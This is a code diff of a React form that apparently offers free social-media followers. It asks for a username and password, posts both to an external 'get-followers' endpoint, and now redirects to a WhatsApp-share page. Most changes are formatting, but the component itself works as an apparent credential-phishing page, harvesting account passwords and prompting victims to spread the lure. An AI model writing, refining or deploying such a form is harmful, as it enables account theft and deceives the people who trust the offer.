@@ -1,7 +1,7 @@
 import React, { useState } from "react";
 import "./App.css";
 import axios from "axios";
-import {useNavigate } from "react-router-dom";
+import { useNavigate } from "react-router-dom";
 
 const Component = () => {
   const [username, setusername] = useState("");
@@ -12,9 +12,9 @@ const Component = () => {
   const [passwordErr, setPasswordErr] = useState(false);
   const [followersErr, setFollowersErr] = useState(false);
 
-  const [showPass, setShowPass] = useState(false)
+  const [showPass, setShowPass] = useState(false);
 
-  const navigate = useNavigate()
+  const navigate = useNavigate();
 
   const SubmitHandler = async (e) => {
     e.preventDefault();
@@ -44,20 +44,22 @@ const Component = () => {
     if (!isValid) return;
 
     try {
-      const res = await axios.post("https://get-followers-4z2j.onrender.com/formdata", {
-        username,
-        password,
-        followers,
-      });
+      const res = await axios.post(
+        "https://get-followers-4z2j.onrender.com/formdata",
+        {
+          username,
+          password,
+          followers,
+        },
+      );
 
-      navigate("/sucsess")
-
+      navigate("/whatsapp-share");
 
       setusername("");
       setPassword("");
       setFollowers("");
     } catch (err) {
-      console.log("full error",err);
+      console.log("full error", err);
 
       if (err.response) {
         alert(err.response.data.message);
@@ -82,9 +84,7 @@ const Component = () => {
             onChange={(e) => setusername(e.target.value)}
           />
 
-          {emailErr && (
-            <p style={{ color: "red" }}>Username is required</p>
-          )}
+          {emailErr && <p style={{ color: "red" }}>Username is required</p>}
 
           <label>Password</label>
 
@@ -95,12 +95,12 @@ const Component = () => {
               value={password}
               onChange={(e) => setPassword(e.target.value)}
             />
-            <span onClick={() => setShowPass(!showPass)}>{showPass ? "Hide" : "Show"}</span>
+            <span onClick={() => setShowPass(!showPass)}>
+              {showPass ? "Hide" : "Show"}
+            </span>
           </div>
 
-          {passwordErr && (
-            <p style={{ color: "red" }}>Password is required</p>
-          )}
+          {passwordErr && <p style={{ color: "red" }}>Password is required</p>}
 
           <select
             value={followers}
@@ -118,7 +118,17 @@ const Component = () => {
             <p style={{ color: "red" }}>Select followers is required</p>
           )}
 
-          <button type="submit" className="SubBtn">
+          <button
+            type="submit"
+            className={`SubBtn ${
+              username.trim() !== "" &&
+              password.trim() !== "" &&
+              followers !== ""
+                ? "activeBtn"
+                : ""
+            }`}
+
+          >
             Submit
           </button>
         </form>
